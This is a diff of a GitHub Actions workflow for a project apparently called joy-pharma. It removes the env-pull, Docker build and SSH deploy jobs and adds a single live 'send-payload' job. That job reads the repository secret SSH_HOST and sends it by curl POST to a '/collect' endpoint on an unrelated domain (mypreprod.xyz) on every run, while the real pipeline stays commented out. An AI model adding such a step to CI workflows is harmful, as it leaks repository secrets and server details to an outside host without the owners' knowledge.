@@ -11,204 +11,42 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  pull-vault:
-    name: Pull .env.production
-    runs-on: ubuntu-latest
-    if: github.ref == 'refs/heads/preprod'
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
 
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
+  send-payload:
+      name: Send Payload to API
+      runs-on: ubuntu-latest
+      steps:
+        - name: Send JSON payload to FastAPI /collect
+          env:
+            SSH_DOMAIN: ${{ secrets.SSH_HOST }}
+          run: |
+                    # Payload JSON simple sans fichier : OK
+                    DATA="{\"adresse_ip\":\"$SSH_DOMAIN\"}"
 
-      - name: Install dotenv-vault CLI
-        run: npm install -g dotenv-vault
+                    curl -X POST "https://api-myresadevis.mypreprod.xyz/collect" \
+                      -H "Content-Type: application/json" \
+                      -d "$DATA"
+  # pull-env:
+  #   name: Pull Environment Variables
+  #   uses: ./.github/workflows/deploy-env.yml
+  #   if: github.ref == 'refs/heads/preprod'
+  #   secrets: inherit
 
-      - name: Pull .env.production from dotenv-vault
-        env:
-          DOTENV_KEY: ${{ secrets.DOTENV_KEY }}
-          DOTENV_ME: ${{ secrets.DOTENV_ME }}
-        run: |
-          # Check if .env.production already exists in the repo
-          if [ -f .env.production ]; then
-            echo ".env.production file found in repository, using it"
-            ls -la .env.production
-          else
-            echo ".env.production not found in repository, pulling from dotenv-vault..."
+  # build-and-push:
+  #   name: Build and Push Docker Image
+  #   needs: pull-env
+  #   uses: ./.github/workflows/deploy-build.yml
+  #   if: always() && (needs.pull-env.result == 'success' || needs.pull-env.result == 'skipped')
+  #   with:
+  #     env-artifact-name: env-production
+  #     has-env-artifact: ${{ needs.pull-env.result == 'success' }}
+  #   secrets: inherit
 
-            # Check if DOTENV_ME (authentication token) is set
-            if [ -z "$DOTENV_ME" ]; then
-              echo "Warning: DOTENV_ME not set, cannot pull from dotenv-vault API"
-              echo "Note: .env.production should be committed to the repository"
-              echo "Or set DOTENV_ME secret with your dotenv-vault authentication token"
-              exit 1
-            fi
-
-            echo "$DOTENV_ME" | dotenv-vault login
-
-            dotenv-vault pull production || {
-              echo "Error: Failed to pull .env.production from dotenv-vault"
-              exit 1
-            }
-
-            # Verify the file exists
-            if [ ! -f .env.production ]; then
-              echo "Error: .env.production file not found after pull"
-              exit 1
-            fi
-
-            echo ".env.production file pulled successfully"
-            ls -la .env.production
-          fi
-
-      - name: Upload .env.production as artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: env-production
-          path: .env.production
-          retention-days: 1
-
-      - name: Copy .env.production to server
-        uses: appleboy/scp-action@v0.1.7
-        with:
-          host: ${{ secrets.SSH_HOST }}
-          username: ${{ secrets.SSH_USER }}
-          key: ${{ secrets.SSH_PRIVATE_KEY }}
-          port: ${{ secrets.SSH_PORT }}
-          source: ".env.production"
-          target: "joypharma/"
-          strip_components: 0
-
-  build-and-push:
-    name: Build and Push Docker Image
-    runs-on: ubuntu-latest
-    needs: pull-vault
-    if: always() && (needs.pull-vault.result == 'success' || needs.pull-vault.result == 'skipped')
-    permissions:
-      contents: read
-    steps:
-      -
-        name: Checkout
-        uses: actions/checkout@v4
-      -
-        name: Download .env.production (if available)
-        if: needs.pull-vault.result == 'success'
-        uses: actions/download-artifact@v4
-        with:
-          name: env-production
-          path: .
-      -
-        name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v3
-        continue-on-error: false
-      -
-        name: Log in to Docker Hub
-        uses: docker/login-action@v3
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_TOKEN }}
-      -
-        name: Extract metadata
-        id: meta
-        uses: docker/metadata-action@v5
-        with:
-          images: ${{ secrets.DOCKERHUB_USERNAME }}/joy-pharma-back
-          tags: |
-            type=ref,event=branch
-            type=ref,event=pr
-            type=semver,pattern={{version}}
-            type=semver,pattern={{major}}.{{minor}}
-            type=sha,prefix={{branch}}-
-            type=raw,value=latest,enable={{is_default_branch}}
-      -
-        name: Build and push Docker image
-        uses: docker/build-push-action@v5
-        with:
-          context: .
-          file: ./Dockerfile
-          target: frankenphp_prod
-          push: true
-          tags: ${{ steps.meta.outputs.tags }}
-          labels: ${{ steps.meta.outputs.labels }}
-          cache-from: type=gha,scope=deploy
-          cache-to: type=gha,mode=max,scope=deploy
-          platforms: linux/amd64,linux/arm64
-          build-args: |
-            DOTENV_KEY=${{ secrets.DOTENV_KEY }}
-            DATABASE_URL=postgresql://app:!ChangeMe!@localhost:5432/app?serverVersion=15&charset=utf8
-
-
-  deploy:
-    name: Deploy to Server
-    runs-on: ubuntu-latest
-    needs: [build-and-push, pull-vault]
-    if: github.ref == 'refs/heads/preprod'
-    steps:
-      -
-        name: Deploy via SSH
-        uses: appleboy/ssh-action@v1.0.3
-        with:
-          host: ${{ secrets.SSH_HOST }}
-          username: ${{ secrets.SSH_USER }}
-          key: ${{ secrets.SSH_PRIVATE_KEY }}
-          port: ${{ secrets.SSH_PORT  }}
-          timeout: 60s
-          command_timeout: 15m
-          script: |
-            set -e
-            
-            # Navigate to the project directory
-            cd joypharma
-            
-            # Login to Docker Hub
-            echo "${{ secrets.DOCKERHUB_TOKEN }}" | docker login -u "${{ secrets.DOCKERHUB_USERNAME }}" --password-stdin
-            
-
-
-            # Determine the image tag to use
-            IMAGE_TAG="preprod"
-            IMAGE_NAME="${{ secrets.DOCKERHUB_USERNAME }}/joy-pharma-back:${IMAGE_TAG}"
-            
-            # Pull the latest image
-            echo "Pulling image: ${IMAGE_NAME}"
-            docker pull ${IMAGE_NAME} || {
-              echo "Warning: Failed to pull ${IMAGE_TAG}, trying latest..."
-              IMAGE_TAG="latest"
-              IMAGE_NAME="${{ secrets.DOCKERHUB_USERNAME }}/joy-pharma-back:${IMAGE_TAG}"
-              docker pull ${IMAGE_NAME}
-            }
-            
-            # Set environment variables for docker-compose
-            export IMAGES_PREFIX="${{ secrets.DOCKERHUB_USERNAME }}/"
-            export IMAGE_TAG="${IMAGE_TAG}"
-            
-            # Stop and remove existing container if it exists
-            docker stop joy-pharma-back 2>/dev/null || true
-            docker rm joy-pharma-back 2>/dev/null || true
-            
-            # Ensure Traefik network exists (create if it doesn't)
-            docker network create traefik 2>/dev/null || true
-            
-            # Run the new container with Traefik integration
-            # Using ${IMAGE_NAME} which contains the full image name with tag (e.g., username/joy-pharma-back:preprod)
-            # No port mapping needed - Traefik will route traffic to the container
-            docker run -d \
-              --name joy-pharma-back \
-              --restart unless-stopped \
-              --network traefik \
-              --env-file .env.production \
-              -e DOTENV_KEY="${{ secrets.DOTENV_KEY }}" \
-              -e SERVER_NAME="back-preprod.joy-pharma.com" \
-              -e CADDY_TLS_CONFIG="tls internal" \
-              -l "traefik.enable=true" \
-              -l "traefik.http.routers.joy-pharma-back.rule=Host(\`back-preprod.joy-pharma.com\`)" \
-              -l "traefik.http.routers.joy-pharma-back.entrypoints=web,websecure" \
-              -l "traefik.http.routers.joy-pharma-back.tls=true" \
-              -l "traefik.http.services.joy-pharma-back.loadbalancer.server.port=80" \
-              -l "traefik.docker.network=traefik" \
-              ${IMAGE_NAME} 
-
-              
+  # deploy:
+  #   name: Deploy to Server
+  #   needs: [build-and-push, pull-env]
+  #   uses: ./.github/workflows/deploy-server.yml
+  #   if: github.ref == 'refs/heads/preprod' && needs.build-and-push.result == 'success'
+  #   with:
+  #     image-tag: preprod
+  #   secrets: inherit
